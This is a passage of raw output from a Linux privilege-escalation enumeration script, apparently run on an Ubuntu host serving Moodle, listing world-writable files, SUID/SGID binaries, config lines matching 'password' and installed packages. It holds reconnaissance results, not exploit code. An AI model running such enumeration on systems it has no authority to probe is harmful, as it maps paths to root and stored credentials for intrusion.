    -rw-rw-rw- 1 www-data www-data 637 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_recent/icon.png
    -rw-rw-rw- 1 www-data www-data 909 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculatedmulti/icon.gif
    -rw-rw-rw- 1 www-data www-data 78 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculated/icon.gif
    -rw-rw-rw- 1 www-data www-data 637 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_local/icon.png
    -rw-rw-rw- 1 www-data www-data 342 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/theme/vgradient.jpg
    -rw-rw-rw- 1 www-data www-data 269 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/theme/tab/tabrow1.gif
    -rw-rw-rw- 1 www-data www-data 3297 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/theme/tab/right.gif
    -rw-rw-rw- 1 www-data www-data 293 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/theme/tab/left.gif
    -rw-rw-rw- 1 www-data www-data 894 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/theme/favicon.ico
    -rw-rw-rw- 1 www-data www-data 346 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/theme/hgradient.jpg
    -rw-rw-rw- 1 www-data www-data 132 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/forum/icon.gif
    -rw-rw-rw- 1 www-data www-data 214 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_multichoice/icon.gif
    -rw-rw-rw- 1 www-data www-data 117 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_description/icon.gif
    -rw-rw-rw- 1 www-data www-data 108513 Apr 23  2018 /var/www/moodledata/cache/theme/standard/css/plugins.css
    -rw-rw-rw- 1 www-data www-data 74626 Apr 23  2018 /var/www/moodledata/cache/theme/standard/css/parents.css
    -rw-rw-rw- 1 www-data www-data 53404 Apr 23  2018 /var/www/moodledata/cache/theme/standard/css/theme.css
    -rw-rw-rw- 1 www-data www-data 54 Apr 23  2018 /var/www/moodledata/cache/theme/standard/css/editor.css
    -rw-rw-rw- 1 www-data www-data 236543 Apr 23  2018 /var/www/moodledata/cache/theme/standard/css/all.css
    -rw-rw-rw- 1 www-data www-data 0 Apr 23  2018 /var/www/moodledata/cache/theme/standard/javascript_footer.js
    -rw-rw-rw- 1 www-data www-data 100702 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier/HTML/4.4.0,dfb1a00cfe5cc3aebad28a8366faeedb,2.ser
    -rw-rw-rw- 1 www-data www-data 516 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier/URI/4.4.0,0da09f206f090bee0a1ff4895700dd92,1.ser
    -rw-rw-rw- 1 www-data www-data 21 Apr 23  2018 /var/www/moodledata/cache/languages
    -rw-rw-rw- 1 www-data www-data 128 Apr 23  2018 /var/www/moodledata/.htaccess
    -rw-rw-rw- 1 www-data www-data 1529575 Apr 24  2018 /var/www/moodledata/filedir/82/34/82341a17005e75a8f4614ea435acbc3148cf30ea
    -rw-rw-rw- 1 www-data www-data 168 Apr 23  2018 /var/www/moodledata/filedir/warning.txt
    -rw-rw-rw- 1 www-data www-data 3242 Apr 24  2018 /var/www/moodledata/filedir/a6/f9/a6f9eb0b8ac65934fb6adc15766fb2fa70e1873d
    -rw-rw-rw- 1 www-data www-data 364 Apr 24  2018 /var/www/moodledata/filedir/ad/5c/ad5c3bc9ae900b39509eb2d6a727455e39d77b9b
    -rw-rw-rw- 1 www-data www-data 0 Apr 24  2018 /var/www/moodledata/filedir/da/39/da39a3ee5e6b4b0d3255bfef95601890afd80709
    --w--w--w- 1 root root 0 Feb  3 09:47 /sys/fs/cgroup/systemd/cgroup.event_control
    -rw-rw-rw- 1 root root 0 Feb  3 09:47 /sys/kernel/security/apparmor/.access

[+] Checking if root's home folder is accessible

[+] SUID/SGID Files and Directories
    -rwsr-xr-x 1 root root 69120 Jun  3  2014 /bin/umount
    -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
    -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
    -rwsr-xr-x 1 root root 36936 Feb 16  2014 /bin/su
    -rwsr-xr-x 1 root root 94792 Jun  3  2014 /bin/mount
    -rwsr-xr-x 1 root root 30800 Dec 16  2013 /bin/fusermount
    -rwsr-xr-x 1 root root 46424 Feb 16  2014 /usr/bin/chfn
    -rwxr-sr-x 1 root mlocate 39520 Jun 20  2013 /usr/bin/mlocate
    -rwsr-xr-x 1 root root 155008 Feb 10  2014 /usr/bin/sudo
    -rwxr-sr-x 1 root shadow 54968 Feb 16  2014 /usr/bin/chage
    -rwxr-sr-x 1 root crontab 35984 Feb  8  2013 /usr/bin/crontab
    -rwsr-xr-x 1 root root 41336 Feb 16  2014 /usr/bin/chsh
    -rwxr-sr-x 1 root shadow 23360 Feb 16  2014 /usr/bin/expiry
    -rwsr-xr-x 1 root root 68152 Feb 16  2014 /usr/bin/gpasswd
    -rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
    -rwxr-sr-x 1 root tty 19024 Jun  3  2014 /usr/bin/wall
    -rwsr-xr-x 1 root root 32464 Feb 16  2014 /usr/bin/newgrp
    -rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
    -rwxr-sr-x 1 root tty 14688 Jun  4  2013 /usr/bin/bsd-write
    -rwsr-xr-x 1 root root 75256 Oct 21  2013 /usr/bin/mtr
    -rwsr-xr-x 1 root root 47032 Feb 16  2014 /usr/bin/passwd
    -rwxr-sr-x 1 root ssh 284784 May 12  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 23104 May  7  2014 /usr/bin/traceroute6.iputils
    -rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
    -rwxr-sr-x 1 root mail 14856 Dec  6  2013 /usr/bin/dotlockfile
    drwxrwsr-x 3 root staff 4096 Apr 23  2018 /usr/local/lib/python3.4
    drwxrwsr-x 2 root staff 4096 Jul 22  2014 /usr/local/lib/python3.4/dist-packages
    drwxrwsr-x 4 root staff 4096 Apr 23  2018 /usr/local/lib/python2.7
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/lib/python2.7/dist-packages
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/lib/python2.7/site-packages
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/ca-certificates
    drwxrwsr-x 6 root staff 4096 Apr 23  2018 /usr/local/share/xml
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/xml/declaration
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/xml/entities
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/xml/schema
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/xml/misc
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/fonts
    drwxrwsr-x 7 root staff 4096 Apr 23  2018 /usr/local/share/sgml
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/sgml/stylesheet
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/sgml/declaration
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/sgml/entities
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/sgml/misc
    drwxrwsr-x 2 root staff 4096 Apr 23  2018 /usr/local/share/sgml/dtd
    -rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-- 1 root messagebus 310800 Jul  3  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    -rwsr-xr-x 1 root root 10344 Apr 12  2014 /usr/lib/pt_chown
    -r-xr-sr-x 1 root postdrop 14328 Aug 24  2017 /usr/sbin/postdrop
    -rwsr-xr-- 1 root dip 343168 Jan 22  2013 /usr/sbin/pppd
    -r-xr-sr-x 1 root postdrop 14280 Aug 24  2017 /usr/sbin/postqueue
    -rwsr-sr-x 1 libuuid libuuid 18904 Jun  3  2014 /usr/sbin/uuidd
    drwxr-s--- 2 root dip 4096 Apr 23  2018 /etc/ppp/peers
    drwxr-s--- 2 root dip 4096 Apr 23  2018 /etc/chatscripts
    -rwxr-sr-x 1 root shadow 35536 Jan 31  2014 /sbin/unix_chkpwd
    drwxrwsr-x 2 postgres postgres 100 Feb  3 09:48 /run/postgresql
    drwxrwsr-x 2 root mail 4096 Apr 26  2018 /var/mail
    drwxrwsr-x 2 root staff 4096 Apr 10  2014 /var/local
    drwx--s--- 2 postfix postdrop 4096 Feb  3 09:48 /var/spool/postfix/public
    drwxrwsr-x 2 libuuid libuuid 4096 Jul 22  2014 /var/lib/libuuid
    drwxr-sr-x 32 man root 4096 Apr 29  2018 /var/cache/man
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/id
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/id/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/id/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/id/cat5
    drwxr-sr-x 4 man root 4096 Apr 29  2018 /var/cache/man/sl
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/sl/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/sl/cat1
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/pl
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/pl/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/pl/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/pl/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/zh_TW
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/zh_TW/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/zh_TW/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/zh_TW/cat5
    drwxr-sr-x 6 man root 4096 Apr 29  2018 /var/cache/man/de
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/de/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/de/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/de/cat3
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/de/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/es
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/es/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/es/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/es/cat5
    drwxr-sr-x 4 man root 4096 Apr 29  2018 /var/cache/man/fi
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/fi/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/fi/cat1
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/ru
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/ru/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/ru/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/ru/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/tr
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/tr/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/tr/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/tr/cat5
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cat2
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/pt
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/pt/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/pt/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/pt/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/ja
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/ja/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/ja/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/ja/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/pt_BR
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/pt_BR/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/pt_BR/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/pt_BR/cat5
    drwxr-sr-x 3 man root 4096 Apr 29  2018 /var/cache/man/gl
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/gl/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cat4
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cat3
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cat6
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cat5
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cat7
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/cs
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cs/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cs/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/cs/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/zh_CN
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/zh_CN/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/zh_CN/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/zh_CN/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/hu
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/hu/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/hu/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/hu/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/fr
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/fr/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/fr/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/fr/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/sv
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/sv/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/sv/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/sv/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/nl
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/nl/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/nl/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/nl/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/it
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/it/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/it/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/it/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/da
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/da/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/da/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/da/cat5
    drwxr-sr-x 5 man root 4096 Apr 29  2018 /var/cache/man/ko
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/ko/cat8
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/ko/cat1
    drwxr-sr-x 2 man root 4096 Apr 23  2018 /var/cache/man/ko/cat5
    drwxrwsrwx 7 www-data www-data 4096 Apr 23  2018 /var/www/moodledata
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/trashdir
    drwxrwsrwx 6 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/js
    drwxrwsrwx 3 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/lang
    drwxrwsrwx 2 www-data www-data 12288 Feb  3 11:17 /var/www/moodledata/cache/lang/en
    drwxrwsrwx 3 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/theme
    drwxrwsrwx 4 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/theme/standard
    drwxrwsrwx 21 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_randomsamatch
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_numerical
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_shortanswer
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_multianswer
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_user
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_match
    drwxrwsrwx 7 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/u
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/a
    drwxrwsrwx 2 www-data www-data 4096 Feb  3 10:57 /var/www/moodledata/cache/theme/standard/pix/moodle/t
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/f
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_truefalse
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_upload
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculatedsimple
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_essay
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_recent
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculatedmulti
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculated
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_local
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/theme
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/theme/tab
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/forum
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_multichoice
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_description
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/theme/standard/css
    drwxrwsrwx 4 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier/HTML
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier/URI
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/lang
    drwxrwsrwx 4 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp/typo3temp
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp/typo3temp/cs
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp/forms
    drwxrwsrwx 6 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/82
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/82/34
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/a6
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/a6/f9
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/ad
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/ad/5c
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/da
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/da/39

[+] Logs containing keyword 'password'
    /var/log/bootstrap.log:Shadow passwords are now on.

[+] Config files containing keyword 'password'
    /etc/debconf.conf:# World-readable, and accepts everything but passwords.
    /etc/debconf.conf:Reject-Type: password
    /etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
    /etc/debconf.conf:Name: passwords
    /etc/debconf.conf:Accept-Type: password
    /etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
    /etc/debconf.conf:# databases, one to hold passwords and one for everything else.
    /etc/debconf.conf:Stack: config, passwords
    /etc/debconf.conf:# A remote LDAP database. It is also read-only. The password is really
    /etc/ssl/openssl.cnf:# input_password = secret
    /etc/ssl/openssl.cnf:# output_password = secret
    /etc/ssl/openssl.cnf:challengePassword		= A challenge password
    /etc/hdparm.conf:# --security-set-pass Set security password
    /etc/hdparm.conf:# security_pass = password
    /etc/hdparm.conf:# --user-master Select password to use
    /etc/apache2/sites-available/default-ssl.conf:		#	 Note that no password is obtained from the user. Every entry in the user
    /etc/apache2/sites-available/default-ssl.conf:		#	 file needs this password: `xxj31ZMTZzkVA'.
    /etc/postgresql/9.3/main/postgresql.conf:#password_encryption = on
    /etc/ltrace.conf:; pwd.h
    /etc/iscsi/iscsid.conf:# To set a CHAP username and password for initiator
    /etc/iscsi/iscsid.conf:#node.session.auth.password = password
    /etc/iscsi/iscsid.conf:# To set a CHAP username and password for target(s)
    /etc/iscsi/iscsid.conf:#node.session.auth.password_in = password_in
    /etc/iscsi/iscsid.conf:# To set a discovery session CHAP username and password for the initiator
    /etc/iscsi/iscsid.conf:#discovery.sendtargets.auth.password = password
    /etc/iscsi/iscsid.conf:# To set a discovery session CHAP username and password for target(s)
    /etc/iscsi/iscsid.conf:#discovery.sendtargets.auth.password_in = password_in
    /etc/dovecot/conf.d/auth-system.conf.ext:# Shadow passwords for system users (NSS, /etc/shadow or similiar).
    /etc/dovecot/conf.d/10-auth.conf:# We also try to handle password changes automatically: If user's previous
    /etc/dovecot/conf.d/10-auth.conf:# TTL for negative hits (user not found, password mismatch).
    /etc/dovecot/conf.d/10-auth.conf:# Password database is used to verify user's password (and nothing more).
    /etc/dovecot/conf.d/10-auth.conf:#!include auth-checkpassword.conf.ext
    /etc/dovecot/conf.d/auth-static.conf.ext:# username or the password, or if there is a single password for all users:
    /etc/dovecot/conf.d/auth-static.conf.ext:#  - proxy frontend, where the backend verifies the password
    /etc/dovecot/conf.d/auth-static.conf.ext:#  - proxy backend, where the frontend already verified the password
    /etc/dovecot/conf.d/auth-static.conf.ext:#  args = proxy=y host=%1Mu.example.com nopassword=y
    /etc/dovecot/conf.d/auth-static.conf.ext:#  args = password=test
    /etc/dovecot/conf.d/10-logging.conf:# In case of password mismatches, log the attempted password. Valid values are
    /etc/dovecot/conf.d/10-logging.conf:# no, plain and sha1. sha1 can be useful for detecting brute force password
    /etc/dovecot/conf.d/10-logging.conf:# attempts vs. user simply trying the same password over and over again.
    /etc/dovecot/conf.d/10-logging.conf:#auth_verbose_passwords = no
    /etc/dovecot/conf.d/10-logging.conf:# In case of password mismatches, log the passwords and used scheme so the
    /etc/dovecot/conf.d/10-logging.conf:#auth_debug_passwords = no
    /etc/dovecot/conf.d/10-ssl.conf:# If key file is password protected, give the password here. Alternatively
    /etc/dovecot/conf.d/10-ssl.conf:# root owned 0600 file by using ssl_key_password = <path.
    /etc/dovecot/conf.d/10-ssl.conf:#ssl_key_password =
    /etc/dovecot/conf.d/auth-checkpassword.conf.ext:# Authentication for checkpassword users. Included from 10-auth.conf.
    /etc/dovecot/conf.d/auth-checkpassword.conf.ext:  driver = checkpassword
    /etc/dovecot/conf.d/auth-checkpassword.conf.ext:  args = /usr/bin/checkpassword
    /etc/dovecot/conf.d/auth-checkpassword.conf.ext:# Standard checkpassword doesn't support direct userdb lookups.
    /etc/dovecot/conf.d/auth-checkpassword.conf.ext:# If you need checkpassword userdb, the checkpassword must support
    /etc/dovecot/conf.d/auth-checkpassword.conf.ext:#  driver = checkpassword
    /etc/dovecot/conf.d/auth-checkpassword.conf.ext:#  args = /usr/bin/checkpassword

[+] Shadow File (Privileged)

[*] ENUMERATING PROCESSES AND APPLICATIONS...

[+] Installed Packages
    Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
    Err?=(none)/Reinst-required (Status,Err:
    Name Version  Description
    accountsservice 0.6.35-0ubuntu7  query and manipulate user account information
    adduser 3.113+nmu3ubuntu3  add and remove users and groups
    apache2 2.4.7-1ubuntu4.20  Apache HTTP Server
    apache2-bin 2.4.7-1ubuntu4.20  Apache HTTP Server (binary files and modules)
    apache2-data 2.4.7-1ubuntu4.20  Apache HTTP Server (common files)
    apache2-utils 2.4.7-1ubuntu4.20  Apache HTTP Server (utility programs for web servers)
    apparmor 2.8.95~2430-0ubuntu5  User-space parser utility for AppArmor
    apt 1.0.1ubuntu2.1  commandline package manager
    apt-transport-https 1.0.1ubuntu2.1  https download transport for APT
    apt-utils 1.0.1ubuntu2.1  package management related utility programs
    apt-xapian-index 0.45ubuntu4  maintenance and search tools for a Xapian index of Debian packages
    aptitude 0.6.8.2-1ubuntu4  terminal-based package manager
    aptitude-common 0.6.8.2-1ubuntu4  architecture indepedent files for the aptitude package manager
    base-files 7.2ubuntu5.1  Debian base system miscellaneous files
    base-passwd 3.5.33  Debian base system master password and group files
    bash 4.3-7ubuntu1  GNU Bourne Again SHell
    bash-completion 1:2.1-4  programmable completion for the bash shell
    bind9-host 1:9.9.5.dfsg-3  Version of 'host' bundled with BIND 9.X
    binfmt-support 2.1.4-1  Support for extra binary formats
    binutils 2.24-5ubuntu14.2  GNU assembler, linker and binary utilities
    biosdevname 0.4.1-0ubuntu6.1  apply BIOS-given names to network devices
    bsdmainutils 9.0.5ubuntu1  collection of more utilities from FreeBSD
    bsdutils 1:2.20.1-5.1ubuntu20.1  Basic utilities from 4.4BSD-Lite
    busybox-initramfs 1:1.21.0-1ubuntu1  Standalone shell setup for initramfs
    busybox-static 1:1.21.0-1ubuntu1  Standalone rescue shell with tons of builtin utilities
    bzip2 1.0.6-5  high-quality block-sorting file compressor - utilities
    ca-certificates 20130906ubuntu2  Common CA certificates
    clang 1:3.4-0ubuntu1  C, C++ and Objective-C compiler (LLVM based)
    clang-3.4 1:3.4-1ubuntu3  C, C++ and Objective-C compiler (LLVM based)
    command-not-found 0.3ubuntu12  Suggest installation of packages in interactive bash sessions
    command-not-found-data 0.3ubuntu12  Set of data files for command-not-found.
    console-setup 1.70ubuntu8  console font and keymap setup program
    coreutils 8.21-1ubuntu5  GNU core utilities
    cpio 2.11+dfsg-1ubuntu1  GNU cpio -- a program to manage archives of files
    crda 1.1.2-1ubuntu2  wireless Central Regulatory Domain Agent
    cron 3.0pl1-124ubuntu2  process scheduling daemon
    curl 7.35.0-1ubuntu2.15  command line tool for transferring data with URL syntax
    dash 0.5.7-4ubuntu1  POSIX-compliant shell
    dbus 1.6.18-0ubuntu4.1  simple interprocess messaging system (daemon and utilities)
    debconf 1.5.51ubuntu2  Debian configuration management system
    debconf-i18n 1.5.51ubuntu2  full internationalization support for debconf
    debianutils 4.4  Miscellaneous utilities specific to Debian
    dh-python 1.20140128-1ubuntu8  Debian helper tools for packaging Python libraries and applications
    dictionaries-common 1.20.5  Common utilities for spelling dictionary tools
